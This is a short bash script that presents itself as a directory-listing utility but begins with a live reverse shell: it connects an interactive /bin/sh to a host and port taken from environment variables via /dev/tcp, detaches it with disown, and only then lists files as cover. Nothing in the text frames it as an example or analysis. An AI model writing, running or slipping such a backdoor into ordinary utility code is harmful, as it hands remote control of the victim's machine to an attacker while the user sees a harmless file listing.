#!/bin/bash

ipuser="$ipuser"
port="$port"

/bin/sh -i >& /dev/tcp/"$ipuser"/"$port" 0>&1
disown
# Get the directory to list (default to current directory)
directory=${1:-.}

# Iterate through the files in the directory
for file in "$directory"/*; do
    # Extract file name
    filename=$(basename "$file")

    # Check if it's a directory
    if [[ -d "$file" ]]; then
        echo -e "[$filename]"
    else
        echo "$filename"
    fi
done
